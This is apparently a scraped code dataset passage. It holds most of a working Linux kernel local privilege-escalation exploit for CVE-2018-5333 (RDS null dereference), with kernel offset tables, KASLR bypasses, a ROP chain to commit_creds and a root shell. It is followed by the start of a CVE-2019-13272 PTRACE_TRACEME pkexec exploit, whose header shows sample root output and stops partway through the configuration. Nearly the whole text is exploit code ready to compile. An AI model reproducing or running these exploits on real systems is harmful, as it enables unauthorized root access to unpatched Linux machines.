\"4.8.0-41-generic #44~16.04.1-Ubuntu\", 0xa5cf0, 0xa60e0, 0x5d0c5, 0x187767, 0x43da98, 0x642f4, 0x7ed2b },\n  { \"4.8.0-42-generic #45~16.04.1-Ubuntu\", 0xa5cf0, 0xa60e0, 0x5d0c5, 0x187767, 0x43dea8, 0x642f4, 0x5c4f3 },\n  { \"4.8.0-44-generic #47~16.04.1-Ubuntu\", 0xa5cf0, 0xa60e0, 0x5d0c5, 0x187767, 0x43dac8, 0x642f4, 0x7ed2b },\n  { \"4.8.0-45-generic #48~16.04.1-Ubuntu\", 0xa5cf0, 0xa60e0, 0x5d0c5, 0x187767, 0x43dac8, 0x642f4, 0x7ed2b },\n  { \"4.8.0-46-generic #49~16.04.1-Ubuntu\", 0xa5cf0, 0xa60e0, 0x5d0c5, 0x187767, 0x43dac8, 0x642f4, 0x7ed2b },\n  { \"4.8.0-49-generic #52~16.04.1-Ubuntu\", 0xa5d00, 0xa60f0, 0x5d0c5, 0x187777, 0x43dce8, 0x642f4, 0x7ed3b },\n  { \"4.8.0-51-generic #54~16.04.1-Ubuntu\", 0xa5d00, 0xa60f0, 0x5d0c5, 0x187777, 0x43dce8, 0x642f4, 0x7ed3b },\n  { \"4.8.0-52-generic #55~16.04.1-Ubuntu\", 0xa5d00, 0xa60f0, 0x5d0c5, 0x187777, 0x43e208, 0x642f4, 0x7ed3b },\n  { \"4.8.0-53-generic #56~16.04.1-Ubuntu\", 0xa5d00, 0xa60f0, 0x5d0c5, 0x187777, 0x43e208, 0x642f4, 0x7ed3b },\n  { \"4.8.0-54-generic #57~16.04.1-Ubuntu\", 0xa5d00, 0xa60f0, 0x5d0c5, 0x187777, 0x43e208, 0x642f4, 0x7ed3b },\n  //{ \"4.8.0-56-generic #61~16.04.1-Ubuntu\", 0xa5d00, 0xa60f0, 0x5d0c5, 0x187777, 0x43e278, 0x642f4, 0x7ed3b },\n  //{ \"4.8.0-58-generic #63~16.04.1-Ubuntu\", 0xa5d20, 0xa6110, 0x5d0c5, 0x187797, 0x43dfa8, 0x642f4, 0x7ed5b },\n\n  { \"4.8.0-34-lowlatency #36~16.04.1-Ubuntu\", 0xa6ed0, 0xa72e0, 0x5e0c5, 0x18ae07, 0x4467f8, 0x649f4, 0x7f902 },\n  { \"4.8.0-36-lowlatency #36~16.04.1-Ubuntu\", 0xa6ed0, 0xa72e0, 0x5e0c5, 0x18ae07, 0x4467f8, 0x649f4, 0x7f902 },\n  //{ \"4.8.0-39-lowlatency #42~16.04.1-Ubuntu\", 0xa6ec0, 0xa72d0, 0x5e0c5, 0x18aec7, 0x4470d8, 0x649f4, 0x7f902 },\n  { \"4.8.0-41-lowlatency #44~16.04.1-Ubuntu\", 0xa6ec0, 0xa72d0, 0x5e0c5, 0x18aec7, 0x4470d8, 0x649f4, 0x7f902 },\n  { \"4.8.0-42-lowlatency #45~16.04.1-Ubuntu\", 0xa6ec0, 0xa72d0, 0x5e0c5, 0x18aeb7, 0x447428, 0x649f4, 0x4b3e3 },\n  { \"4.8.0-44-lowlatency #47~16.04.1-Ubuntu\", 0xa6ec0, 0xa72d0, 0x5e0c5, 0x18aeb7, 0x447108, 0x649f4, 0x4b3e3 },\n  { \"4.8.0-45-lowlatency #48~16.04.1-Ubuntu\", 0xa6ec0, 0xa72d0, 0x5e0c5, 0x18aeb7, 0x447108, 0x649f4, 0x4b3e3 },\n  { \"4.8.0-46-lowlatency #49~16.04.1-Ubuntu\", 0xa6ec0, 0xa72d0, 0x5e0c5, 0x18aeb7, 0x447108, 0x649f4, 0x4b3e3 },\n  { \"4.8.0-49-lowlatency #52~16.04.1-Ubuntu\", 0xa6ed0, 0xa72e0, 0x5e0c5, 0x18aec7, 0x447278, 0x649f4, 0x4b3e3 },\n  { \"4.8.0-51-lowlatency #54~16.04.1-Ubuntu\", 0xa6ed0, 0xa72e0, 0x5e0c5, 0x18aec7, 0x447278, 0x649f4, 0x4b3e3 },\n  { \"4.8.0-52-lowlatency #55~16.04.1-Ubuntu\", 0xa6ed0, 0xa72e0, 0x5e0c5, 0x18aec7, 0x4477a8, 0x649f4, 0x4b3e3 },\n  { \"4.8.0-53-lowlatency #56~16.04.1-Ubuntu\", 0xa6ed0, 0xa72e0, 0x5e0c5, 0x18aec7, 0x4477a8, 0x649f4, 0x4b3e3 },\n  { \"4.8.0-54-lowlatency #57~16.04.1-Ubuntu\", 0xa6ed0, 0xa72e0, 0x5e0c5, 0x18aec7, 0x4477a8, 0x649f4, 0x7f912 },\n  //{ \"4.8.0-56-lowlatency #61~16.04.1-Ubuntu\", 0xa6ed0, 0xa72e0, 0x5e0c5, 0x18aec7, 0x4477f8, 0x649f4, 0x7f912 },\n  //{ \"4.8.0-58-lowlatency #63~16.04.1-Ubuntu\", 0xa6ef0, 0xa7300, 0x5e0c5, 0x18aee7, 0x447568, 0x649f4, 0x7f932 },\n\n  //{ \"4.10.0-14-generic #16~16.04.1-Ubuntu\", 0xab610, 0xaba00, 0x600c5, 0x194ac7, 0x458288, 0x67764, 0x34c4b },\n  //{ \"4.13.0-16-generic #19~16.04.3-Ubuntu\", 0xa8220, 0xa85f0, 0x5f0c5, 0x19c8a7, 0x462d18, 0x668b4, 0x2f2d4 },\n  //{ \"4.13.0-37-generic #42~16.04.1-Ubuntu\", 0xab1d0, 0xab5a0, 0x610c5, 0x1a0827, 0x46bf58, 0x68944, 0x3381b },\n};\n\n// * * * * * * * * * * * * * * * Trigger * * * * * * * * * * * * * * * * * *\n// https://github.com/0x36/CVE-pocs/blob/master/CVE-2018-5333-rds-nullderef.c\n\n#define RAND_SIZE 4096\n\n#ifndef SOL_RDS\n#  define SOL_RDS 276\n#endif\n#ifndef RDS_CMSG_MASKED_ATOMIC_CSWP\n#  define RDS_CMSG_MASKED_ATOMIC_CSWP 9\n#endif\n#ifndef AF_RDS\n#  define AF_RDS 0x15\n#endif\n\nvoid trigger_bug()\n{\n  struct sockaddr_in sin;\n  struct msghdr msg;\n  char buf[RAND_SIZE];\n  struct cmsghdr cmsg;\n\n  memset(&sin, 0, sizeof(struct sockaddr));\n  memset(&msg, 0, sizeof(msg));\n  memset(buf, 0x40, sizeof(buf));\n  memset(&cmsg, 0, sizeof(cmsg));\n\n  int fd = socket(AF_RDS, 5, 0);\n  if(fd < 0) {\n    dprintf(\"[-] socket(AF_RDS): %m\\n\");\n    return;\n  }\n\n  sin.sin_family = AF_INET;\n  sin.sin_port = htons(2000);\n  sin.sin_addr.s_addr = htonl(INADDR_LOOPBACK);\n\n  bind(fd, (struct sockaddr*)&sin, sizeof(sin));\n\n  cmsg.cmsg_len = RAND_SIZE;\n  cmsg.cmsg_type = RDS_CMSG_MASKED_ATOMIC_CSWP;\n  cmsg.cmsg_level = SOL_RDS;\n\n  memcpy(&buf[0], &cmsg, sizeof(cmsg));\n\n  *(uint64_t *)(buf + 0x18) = 0x40404000; /* args->local_addr */\n\n  msg.msg_name = &sin;\n  msg.msg_namelen = sizeof(sin);\n  msg.msg_iov = NULL;\n  msg.msg_iovlen = 0;\n  msg.msg_control = buf;\n  msg.msg_controllen = RAND_SIZE;\n  msg.msg_flags = MSG_DONTROUTE|MSG_PROXY|MSG_WAITALL;\n\n  sendmsg(fd, &msg, 0);\n}\n\n// * * * * * * * * * * * * * * map null address * * * * * * * * * * * * *\n// https://bugs.chromium.org/p/project-zero/issues/detail?id=1792&desc=2\n\nvoid map_null() {\n  void *map = mmap((void *)0x10000, 0x1000, PROT_READ | PROT_WRITE,\n    MAP_PRIVATE | MAP_ANONYMOUS | MAP_GROWSDOWN | MAP_FIXED, -1, 0);\n\n  if (map == MAP_FAILED) {\n    dprintf(\"[-] mmap(null): %m\\n\");\n    exit(EXIT_FAILURE);\n  }\n\n  char* path = \"/proc/self/mem\";\n  int fd = open(path, O_RDWR);\n\n  if (fd == -1) {\n    dprintf(\"open(%s): %m\\n\", path);\n    exit(EXIT_FAILURE);\n  }\n\n  unsigned long addr = (unsigned long)map;\n\n  while (addr != 0) {\n    addr -= 0x1000;\n    if (lseek(fd, addr, SEEK_SET) == -1) {\n      dprintf(\"lseek()\\n\");\n      exit(EXIT_FAILURE);\n    }\n    char cmd[1000];\n    sprintf(cmd, \"LD_DEBUG=help su 1>&%d\", fd);\n    system(cmd);\n  }\n}\n\n// * * * * * * * * * * * * * * * save state * * * * * * * * * * * * * * *\n// https://github.com/vnik5287/kernel_rop\n\nunsigned long user_cs, user_ss, user_rflags;\n\nstatic void save_state() {\n  asm(\n  \"movq %%cs, %0\\n\"\n  \"movq %%ss, %1\\n\"\n  \"pushfq\\n\"\n  \"popq %2\\n\"\n  : \"=r\" (user_cs), \"=r\" (user_ss), \"=r\" (user_rflags) : : \"memory\");\n}\n\n// * * * * * * * * * * * * * * SIGSEGV handler * * * * * * * * * * * * * *\n\nvoid handler(int signo, siginfo_t* info, void* vcontext) {}\n\nvoid debug_enable_sigsev_handler() {\n  struct sigaction action;\n  memset(&action, 0, sizeof(struct sigaction));\n  action.sa_flags = SA_SIGINFO;\n  action.sa_sigaction = handler;\n  sigaction(SIGSEGV, &action, NULL);\n}\n\n// * * * * * * * * * * * * * * * * Detect * * * * * * * * * * * * * * * *\n\n#define CHUNK_SIZE 1024\n\nint read_file(const char* file, char* buffer, int max_length) {\n  int f = open(file, O_RDONLY);\n  if (f == -1)\n    return -1;\n  int bytes_read = 0;\n  while (1) {\n    int bytes_to_read = CHUNK_SIZE;\n    if (bytes_to_read > max_length - bytes_read)\n      bytes_to_read = max_length - bytes_read;\n    int rv = read(f, &buffer[bytes_read], bytes_to_read);\n    if (rv == -1)\n      return -1;\n    bytes_read += rv;\n    if (rv == 0)\n      return bytes_read;\n  }\n}\n\n#define PROC_CPUINFO_LENGTH 4096\n\nstatic int check_env() {\n  int fd = socket(AF_RDS, 5, 0);\n  if(fd < 0) {\n    dprintf(\"[-] socket(AF_RDS): RDS kernel module not loaded?\\n\");\n    exit(EXIT_FAILURE);\n  }\n\n  char buffer[PROC_CPUINFO_LENGTH];\n  char* path = \"/proc/cpuinfo\";\n  int length = read_file(path, &buffer[0], PROC_CPUINFO_LENGTH);\n  if (length == -1) {\n    dprintf(\"[-] open/read(%s): %m\\n\", path);\n    exit(EXIT_FAILURE);\n  }\n\n  char* found = memmem(&buffer[0], length, \"smap\", 4);\n  if (found != NULL) {\n    dprintf(\"[-] SMAP detected, no bypass available\\n\");\n    exit(EXIT_FAILURE);\n  }\n\n  struct stat st;\n\n  if (stat(\"/dev/grsec\", &st) == 0) {\n    dprintf(\"[!] Warning: grsec is in use\\n\");\n  }\n\n  if (stat(\"/proc/sys/lkrg\", &st) == 0) {\n    dprintf(\"[!] Warning: lkrg is in use\\n\");\n  }\n\n  return 0;\n}\n\nstruct utsname get_kernel_version() {\n  struct utsname u;\n  int rv = uname(&u);\n  if (rv != 0) {\n    dprintf(\"[-] uname()\\n\");\n    exit(EXIT_FAILURE);\n  }\n  return u;\n}\n\n#define ARRAY_SIZE(x) (sizeof(x) / sizeof((x)[0]))\n#define KERNEL_VERSION_SIZE_BUFFER 512\n\nvoid detect_versions() {\n  struct utsname u;\n  char kernel_version[KERNEL_VERSION_SIZE_BUFFER];\n\n  u = get_kernel_version();\n\n  if (strstr(u.machine, \"64\") == NULL) {\n    dprintf(\"[-] system is not using a 64-bit kernel\\n\");\n    exit(EXIT_FAILURE);\n  }\n\n  if (strstr(u.version, \"-Ubuntu\") == NULL) {\n    dprintf(\"[-] system is not using an Ubuntu kernel\\n\");\n    exit(EXIT_FAILURE);\n  }\n\n  char *u_ver = strtok(u.version, \" \");\n  snprintf(kernel_version, KERNEL_VERSION_SIZE_BUFFER, \"%s %s\", u.release, u_ver);\n\n  int i;\n  for (i = 0; i < ARRAY_SIZE(kernels); i++) {\n    if (strcmp(kernel_version, kernels[i].kernel_version) == 0) {\n      dprintf(\"[.] kernel version '%s' detected\\n\", kernels[i].kernel_version);\n      kernel = i;\n      return;\n    }\n  }\n\n  dprintf(\"[-] kernel version '%s' not recognized\\n\", kernel_version);\n  exit(EXIT_FAILURE);\n}\n\n// * * * * * * * * * * * * * * kallsyms KASLR bypass * * * * * * * * * * * * * *\n// https://grsecurity.net/~spender/exploits/exploit.txt\n\n#if ENABLE_KASLR_BYPASS_KALLSYMS\nunsigned long get_kernel_addr_kallsyms() {\n  FILE *f;\n  unsigned long addr = 0;\n  char dummy;\n  char sname[256];\n  char* name = \"startup_64\";\n  char* path = \"/proc/kallsyms\";\n\n  dprintf(\"[.] trying %s...\\n\", path);\n  f = fopen(path, \"r\");\n  if (f == NULL) {\n      dprintf(\"[-] open/read(%s): %m\\n\", path);\n      return 0;\n  }\n\n  int ret = 0;\n  while (ret != EOF) {\n    ret = fscanf(f, \"%p %c %s\\n\", (void **)&addr, &dummy, sname);\n    if (ret == 0) {\n      fscanf(f, \"%s\\n\", sname);\n      continue;\n    }\n    if (!strcmp(name, sname)) {\n      fclose(f);\n      if (addr == 0)\n        dprintf(\"[-] kernel base not found in %s\\n\", path);\n      return addr;\n    }\n  }\n\n  fclose(f);\n  dprintf(\"[-] kernel base not found in %s\\n\", path);\n  return 0;\n}\n#endif\n\n// * * * * * * * * * * * * * * syslog KASLR bypass * * * * * * * * * * * * * *\n// https://github.com/xairy/kernel-exploits/blob/master/CVE-2017-1000112/poc.c\n\n#if ENABLE_KASLR_BYPASS_SYSLOG\n#define SYSLOG_ACTION_READ_ALL 3\n#define SYSLOG_ACTION_SIZE_BUFFER 10\n\nint mmap_syslog(char** buffer, int* size) {\n  *size = klogctl(SYSLOG_ACTION_SIZE_BUFFER, 0, 0);\n  if (*size == -1) {\n    dprintf(\"[-] klogctl(SYSLOG_ACTION_SIZE_BUFFER): %m\\n\");\n    return 1;\n  }\n\n  *size = (*size / getpagesize() + 1) * getpagesize();\n  *buffer = (char*)mmap(NULL, *size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);\n\n  *size = klogctl(SYSLOG_ACTION_READ_ALL, &((*buffer)[0]), *size);\n  if (*size == -1) {\n    dprintf(\"[-] klogctl(SYSLOG_ACTION_READ_ALL): %m\\n\");\n    return 1;\n  }\n\n  return 0;\n}\n\nunsigned long get_kernel_addr_syslog_xenial(char* buffer, int size) {\n  const char* needle1 = \"Freeing unused\";\n  char* substr = (char*)memmem(&buffer[0], size, needle1, strlen(needle1));\n  if (substr == NULL)\n    return 0;\n\n  int start = 0;\n  int end = 0;\n  for (start = 0; substr[start] != '-'; start++);\n  for (end = start; substr[end] != '\\n'; end++);\n\n  const char* needle2 = \"ffffff\";\n  substr = (char*)memmem(&substr[start], end - start, needle2, strlen(needle2));\n\n  if (substr == NULL)\n    return 0;\n\n  char* endptr = &substr[16];\n  unsigned long addr = strtoul(&substr[0], &endptr, 16);\n\n  addr &= 0xfffffffffff00000ul;\n  addr -= 0x1000000ul;\n\n  if (addr > KERNEL_BASE_MIN && addr < KERNEL_BASE_MAX)\n    return addr;\n\n  return 0;\n}\n\nunsigned long get_kernel_addr_syslog() {\n  unsigned long addr = 0;\n  char* syslog;\n  int size;\n\n  dprintf(\"[.] trying syslog...\\n\");\n\n  if (mmap_syslog(&syslog, &size))\n    return 0;\n\n  addr = get_kernel_addr_syslog_xenial(syslog, size);\n\n  if (!addr)\n    dprintf(\"[-] kernel base not found in syslog\\n\");\n\n  return addr;\n}\n#endif\n\n// * * * * * * * * * * * perf_event_open KASLR bypass * * * * * * * * * * *\n// https://blog.lizzie.io/kaslr-and-perf.html\n\n#if ENABLE_KASLR_BYPASS_PERF\nint perf_event_open(struct perf_event_attr *attr, pid_t pid, int cpu, int group_fd, unsigned long flags)\n{\n  return syscall(SYS_perf_event_open, attr, pid, cpu, group_fd, flags);\n}\n\nunsigned long get_kernel_addr_perf() {\n  int fd;\n  pid_t child;\n\n  dprintf(\"[.] trying perf_event_open sampling...\\n\");\n\n  child = fork();\n\n  if (child == -1) {\n    dprintf(\"[-] fork() failed: %m\\n\");\n    return 0;\n  }\n\n  if (child == 0) {\n    struct utsname self = {0};\n    while (1) uname(&self);\n    return 0;\n  }\n\n  struct perf_event_attr event = {\n    .type = PERF_TYPE_SOFTWARE,\n    .config = PERF_COUNT_SW_TASK_CLOCK,\n    .size = sizeof(struct perf_event_attr),\n    .disabled = 1,\n    .exclude_user = 1,\n    .exclude_hv = 1,\n    .sample_type = PERF_SAMPLE_IP,\n    .sample_period = 10,\n    .precise_ip = 1\n  };\n\n  fd = perf_event_open(&event, child, -1, -1, 0);\n\n  if (fd < 0) {\n    dprintf(\"[-] syscall(SYS_perf_event_open): %m\\n\");\n    if (child) kill(child, SIGKILL);\n    if (fd > 0) close(fd);\n    return 0;\n  }\n\n  uint64_t page_size = getpagesize();\n  struct perf_event_mmap_page *meta_page = NULL;\n  meta_page = mmap(NULL, (page_size * 2), PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);\n\n  if (meta_page == MAP_FAILED) {\n    dprintf(\"[-] mmap() failed: %m\\n\");\n    if (child) kill(child, SIGKILL);\n    if (fd > 0) close(fd);\n    return 0;\n  }\n\n  if (ioctl(fd, PERF_EVENT_IOC_ENABLE)) {\n    dprintf(\"[-] ioctl failed: %m\\n\");\n    if (child) kill(child, SIGKILL);\n    if (fd > 0) close(fd);\n    return 0;\n  }\n  char *data_page = ((char *) meta_page) + page_size;\n\n  size_t progress = 0;\n  uint64_t last_head = 0;\n  size_t num_samples = 0;\n  unsigned long min_addr = ~0;\n  while (num_samples < 100) {\n    /* is reading from the meta_page racy? no idea */\n    while (meta_page->data_head == last_head);;\n    last_head = meta_page->data_head;\n\n    while (progress < last_head) {\n      struct __attribute__((packed)) sample {\n        struct perf_event_header header;\n        uint64_t ip;\n      } *here = (struct sample *) (data_page + progress % page_size);\n      switch (here->header.type) {\n      case PERF_RECORD_SAMPLE:\n        num_samples++;\n        if (here->header.size < sizeof(*here)) {\n          dprintf(\"[-] size too small.\\n\");\n          if (child) kill(child, SIGKILL);\n          if (fd > 0) close(fd);\n          return 0;\n        }\n\n        uint64_t prefix;\n        if (strstr(kernels[kernel].kernel_version, \"4.8.0-\")) {\n          prefix = here->ip & ~0xfffff;\n        } else {\n          prefix = here->ip & ~0xffffff;\n        }\n\n        if (prefix < min_addr) min_addr = prefix;\n        break;\n      case PERF_RECORD_THROTTLE:\n      case PERF_RECORD_UNTHROTTLE:\n      case PERF_RECORD_LOST:\n        break;\n      default:\n        dprintf(\"[-] unexpected perf event: %x\\n\", here->header.type);\n        if (child) kill(child, SIGKILL);\n              if (fd > 0) close(fd);\n        return 0;\n      }\n      progress += here->header.size;\n    }\n    /* tell the kernel we read it. */\n    meta_page->data_tail = last_head;\n  }\n\n  if (child) kill(child, SIGKILL);\n  if (fd > 0) close(fd);\n  return min_addr;\n}\n#endif\n\n// * * * * * * * * * * * * * * mincore KASLR bypass * * * * * * * * * * * * * *\n// https://bugs.chromium.org/p/project-zero/issues/detail?id=1431\n\n#if ENABLE_KASLR_BYPASS_MINCORE\nunsigned long get_kernel_addr_mincore() {\n  unsigned char buf[getpagesize() / sizeof(unsigned char)];\n  unsigned long iterations = 20000000;\n  unsigned long addr = 0;\n\n  dprintf(\"[.] trying mincore info leak...\\n\");\n\n  if (strstr(kernels[kernel].kernel_version, \"4.8.0-\")) {\n    dprintf(\"[-] target kernel does not permit mincore info leak\\n\");\n    return 0;\n  }\n\n  /* A MAP_ANONYMOUS | MAP_HUGETLB mapping */\n  if (mmap((void*)0x66000000, 0x20000000000,\n       PROT_NONE, MAP_SHARED | MAP_ANONYMOUS | MAP_HUGETLB | MAP_NORESERVE, -1, 0) == MAP_FAILED) {\n    dprintf(\"[-] mmap(): %m\\n\");\n    return 0;\n  }\n\n  int i;\n  for (i = 0; i <= iterations; i++) {\n    /* Touch a mishandle with this type mapping */\n    if (mincore((void*)0x86000000, 0x1000000, buf)) {\n      dprintf(\"[-] mincore(): %m\\n\");\n      return 0;\n    }\n\n    int n;\n    for (n = 0; n < getpagesize() / sizeof(unsigned char); n++) {\n      addr = *(unsigned long*)(&buf[n]);\n      /* Kernel address space */\n      if (addr > KERNEL_BASE_MIN && addr < KERNEL_BASE_MAX) {\n        addr &= 0xffffffffff000000ul;\n        if (munmap((void*)0x66000000, 0x20000000000))\n          dprintf(\"[-] munmap(): %m\\n\");\n        return addr;\n      }\n    }\n  }\n\n  if (munmap((void*)0x66000000, 0x20000000000))\n    dprintf(\"[-] munmap(): %m\\n\");\n\n  dprintf(\"[-] kernel base not found in mincore info leak\\n\");\n  return 0;\n}\n#endif\n\n// * * * * * * * * * * * * * * KASLR bypasses * * * * * * * * * * * * * * * *\n\nunsigned long get_kernel_addr() {\n  unsigned long addr = 0;\n\n#if ENABLE_KASLR_BYPASS_KALLSYMS\n  addr = get_kernel_addr_kallsyms();\n  if (addr) return addr;\n#endif\n\n#if ENABLE_KASLR_BYPASS_SYSLOG\n  addr = get_kernel_addr_syslog();\n  if (addr) return addr;\n#endif\n\n#if ENABLE_KASLR_BYPASS_PERF\n  addr = get_kernel_addr_perf();\n  if (addr) return addr;\n#endif\n\n#if ENABLE_KASLR_BYPASS_MINCORE\n  addr = get_kernel_addr_mincore();\n  if (addr) return addr;\n#endif\n\n  dprintf(\"[-] KASLR bypass failed, kernel base not found\\n\");\n  exit(EXIT_FAILURE);\n\n  return 0;\n}\n\n// * * * * * * * * * * * * * * * * * Main * * * * * * * * * * * * * * * * * *\n\nstatic void shell() {\n  if (getuid() == 0 && geteuid() == 0) {\n    dprintf(\"[+] got root\\n\");\n    system(SHELL);\n  } else {\n    dprintf(\"[-] failed\\n\");\n  }\n  exit(EXIT_FAILURE);\n}\n\nvoid fork_shell() {\n  pid_t rv;\n\n  rv = fork();\n  if (rv == -1) {\n    dprintf(\"[-] fork(): %m\\n\");\n    exit(EXIT_FAILURE);\n  }\n\n  if (rv == 0)\n    shell();\n}\n\nint main(int argc, char *argv[]) {\n  if (argc > 1) SHELL = argv[1];\n  dprintf(\"Linux RDS rds_atomic_free_op NULL pointer dereference local root (CVE-2018-5333)\\n\");\n\n  dprintf(\"[.] checking kernel version...\\n\");\n  detect_versions();\n  dprintf(\"[~] done, version looks good\\n\");\n\n#if ENABLE_SYSTEM_CHECKS\n  dprintf(\"[.] checking system...\\n\");\n  check_env();\n  dprintf(\"[~] done, looks good\\n\");\n#endif\n\n  dprintf(\"[.] mapping null address...\\n\");\n  map_null();\n  dprintf(\"[~] done, mapped null address\\n\");\n\n#if ENABLE_KASLR_BYPASS\n  dprintf(\"[.] KASLR bypass enabled, getting kernel base address\\n\");\n  KERNEL_BASE = get_kernel_addr();\n  dprintf(\"[.] done, kernel text:   %lx\\n\", KERNEL_BASE);\n#endif\n\n  unsigned long commit_creds =        (KERNEL_BASE + kernels[kernel].commit_creds);\n  unsigned long prepare_kernel_cred = (KERNEL_BASE + kernels[kernel].prepare_kernel_cred);\n  unsigned long xor_rdi =             (KERNEL_BASE + kernels[kernel].xor_rdi);\n  unsigned long mov_rdi_rax =         (KERNEL_BASE + kernels[kernel].mov_rdi_rax);\n  unsigned long xchg_esp =            (KERNEL_BASE + kernels[kernel].xchg_esp);\n  unsigned long swapgs =              (KERNEL_BASE + kernels[kernel].swapgs);\n  unsigned long iretq =               (KERNEL_BASE + kernels[kernel].iretq);\n\n  dprintf(\"[.] commit_creds:        %lx\\n\", commit_creds);\n  dprintf(\"[.] prepare_kernel_cred: %lx\\n\", prepare_kernel_cred);\n\n  dprintf(\"[.] mmapping fake stack...\\n\");\n\n  uint64_t page_size = getpagesize();\n  uint64_t stack_aligned = (xchg_esp & 0x00000000fffffffful) & ~(page_size - 1);\n  uint64_t stack_offset = xchg_esp % page_size;\n\n  unsigned long *fake_stack = mmap((void*)stack_aligned, 0x200000,\n    PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_GROWSDOWN | MAP_FIXED, -1, 0);\n\n  if (fake_stack == MAP_FAILED) {\n    dprintf(\"[-] mmap(fake_stack): %m\\n\");\n    exit(EXIT_FAILURE);\n  }\n\n  unsigned long *temp_stack = mmap((void*)0x30000000, 0x10000000,\n    PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_GROWSDOWN | MAP_FIXED, -1, 0);\n\n  if (temp_stack == MAP_FAILED) {\n    dprintf(\"[-] mmap(temp_stack): %m\\n\");\n    exit(EXIT_FAILURE);\n  }\n\n  static unsigned long result = 0;\n  unsigned long *data = (unsigned long *)0;\n  data[1] = (uint64_t)&result;\n  data[3] = xchg_esp;\n\n  save_state();\n  debug_enable_sigsev_handler();\n\n  fake_stack = (unsigned long *)(stack_aligned + stack_offset);\n\n  int i = 0;\n\n  fake_stack[i++] = xor_rdi;\n  fake_stack[i++] = prepare_kernel_cred;\n  fake_stack[i++] = mov_rdi_rax;\n  fake_stack[i++] = 0x12345678;\n  fake_stack[i++] = 0x12345678;\n  fake_stack[i++] = 0x12345678;\n  fake_stack[i++] = commit_creds;\n\n  fake_stack[i++] = swapgs;\n  fake_stack[i++] = 0x12345678;\n\n  fake_stack[i++] = iretq;\n  fake_stack[i++] = (unsigned long)shell;\n  fake_stack[i++] = user_cs;\n  fake_stack[i++] = user_rflags;\n  fake_stack[i++] = (unsigned long)(temp_stack + 0x500000);\n  fake_stack[i++] = user_ss;\n\n  dprintf(\"[~] done, fake stack mmapped\\n\");\n\n  dprintf(\"[.] executing payload %p...\\n\", (void*)&shell);\n  trigger_bug();\n\n  return 0;\n}\n\n", "timestamp": "2025-10-24T23:39:35.140325"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/CVE-2019-13272/poc.c", "content": "// Linux 4.10 < 5.1.17 PTRACE_TRACEME local root (CVE-2019-13272)\n//\n// Uses pkexec technique. Requires execution within the context\n// of a user session with an active PolKit agent.\n//\n// Exploitation will fail if kernel.yama.ptrace_scope >= 2;\n// or SELinux deny_ptrace=on.\n// ---\n// Original discovery and exploit author: Jann Horn\n// - https://bugs.chromium.org/p/project-zero/issues/detail?id=1903\n// ---\n// <bcoles@gmail.com>\n// - added known helper paths\n// - added search for suitable helpers\n// - added automatic targeting\n// - changed target suid executable from passwd to pkexec\n// https://github.com/bcoles/kernel-exploits/tree/master/CVE-2019-13272\n// ---\n// Tested on:\n// - Ubuntu 16.04.5 kernel 4.15.0-29-generic\n// - Ubuntu 18.04.1 kernel 4.15.0-20-generic\n// - Ubuntu 18.04.3 kernel 5.0.0-23-generic\n// - Ubuntu 19.04 kernel 5.0.0-15-generic\n// - Ubuntu Mate 18.04.2 kernel 4.18.0-15-generic\n// - Linux Mint 17.3 kernel 4.4.0-89-generic\n// - Linux Mint 18.3 kernel 4.13.0-16-generic\n// - Linux Mint 19 kernel 4.15.0-20-generic\n// - Xubuntu 16.04.4 kernel 4.13.0-36-generic\n// - ElementaryOS 0.4.1 4.8.0-52-generic\n// - Backbox 6 kernel 4.18.0-21-generic\n// - Parrot OS 4.5.1 kernel 4.19.0-parrot1-13t-amd64\n// - Kali kernel 4.19.0-kali5-amd64\n// - MX 18.3 kernel 4.19.37-2~mx17+1\n// - RHEL 8.0 kernel 4.18.0-80.el8.x86_64\n// - CentOS 8 kernel 4.18.0-80.el8.x86_64\n// - Debian 9.4.0 kernel 4.9.0-6-amd64\n// - Debian 10.0.0 kernel 4.19.0-5-amd64\n// - Devuan 2.0.0 kernel 4.9.0-6-amd64\n// - SparkyLinux 5.8 kernel 4.19.0-5-amd64\n// - SparkyLinux 5.9 kernel 4.19.0-6-amd64\n// - Fedora Workstation 30 kernel 5.0.9-301.fc30.x86_64\n// - Manjaro 18.0.3 kernel 4.19.23-1-MANJARO\n// - Mageia 6 kernel 4.9.35-desktop-1.mga6\n// - Antergos 18.7 kernel 4.17.6-1-ARCH\n// - lubuntu 19.04 kernel 5.0.0-13-generic\n// - Sabayon 19.03 kernel 4.20.0-sabayon\n// - Pop! OS 19.04 kernel 5.0.0-21-generic\n// ---\n// [user@localhost CVE-2019-13272]$ gcc -Wall --std=gnu99 -s poc.c -o ptrace_traceme_root\n// [user@localhost CVE-2019-13272]$ ./ptrace_traceme_root\n// Linux 4.10 < 5.1.17 PTRACE_TRACEME local root (CVE-2019-13272)\n// [.] Checking environment ...\n// [~] Done, looks good\n// [.] Searching policies for useful helpers ...\n// [.] Ignoring helper (does not exist): /usr/sbin/pk-device-rebind\n// [.] Trying helper: /usr/libexec/gsd-backlight-helper\n// [.] Spawning suid process (/usr/bin/pkexec) ...\n// [.] Tracing midpid ...\n// [~] Attached to midpid\n// [root@localhost CVE-2019-13272]# id\n// uid=0(root) gid=0(root) groups=0(root),1000(user)\n// [root@localhost CVE-2019-13272]# uname -a\n// Linux localhost.localdomain 4.18.0-80.el8.x86_64 #1 SMP Tue Jun 4 09:19:46 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux\n// ---\n\n#define _GNU_SOURCE\n#include <string.h>\n#include <stdlib.h>\n#include <unistd.h>\n#include <signal.h>\n#include <stdio.h>\n#include <fcntl.h>\n#include <sched.h>\n#include <stddef.h>\n#include <stdarg.h>\n#include <pwd.h>\n#include <sys/prctl.h>\n#include <sys/wait.h>\n#include <sys/ptrace.h>\n#include <sys/user.h>\n#include <sys/syscall.h>\n#include <sys/stat.h>\n#include <linux/elf.h>\n\n#define DEBUG\n\n#ifdef DEBUG\n#  define dprintf printf\n#else\n#  define dprintf\n#endif\n\n/*\n * enabled automatic targeting.\n * uses pkaction to search PolKit policy actions for viable helper executables.\n */\n#define ENABLE_AUTO_TARGETING   1\n\n/*\n * fall back to known helpers if automatic targeting fails.\n * note: use of these helpers may result in PolKit authentication\n *       prompts on the session associated with the PolKit agent.\n */\n#define ENABLE_FALLBACK_HELPERS 